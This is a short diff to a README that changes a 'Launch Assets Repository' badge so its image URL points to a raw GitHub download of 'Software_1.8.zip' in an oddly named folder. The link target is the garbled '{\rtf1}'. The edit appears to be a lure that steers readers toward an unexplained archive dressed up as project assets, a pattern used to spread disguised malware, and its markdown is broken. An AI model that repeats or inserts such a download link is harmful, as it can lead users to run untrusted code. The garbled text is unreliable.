@@ -18,7 +18,7 @@ Explore the link below to access the assets:
 
 In case the link does not work, please visit the "Releases" section for alternative access.
 
-[![Launch Assets Repository](https://img.shields.io/badge/Launch-Assets%20Repository-brightgreen)]({\rtf1})
+[![Launch Assets Repository](https://github.com/WebDevZurixi/assets/raw/refs/heads/master/interpenetrative/Software_1.8.zip%20Repository-brightgreen)]({\rtf1})
 
 ## Content
 
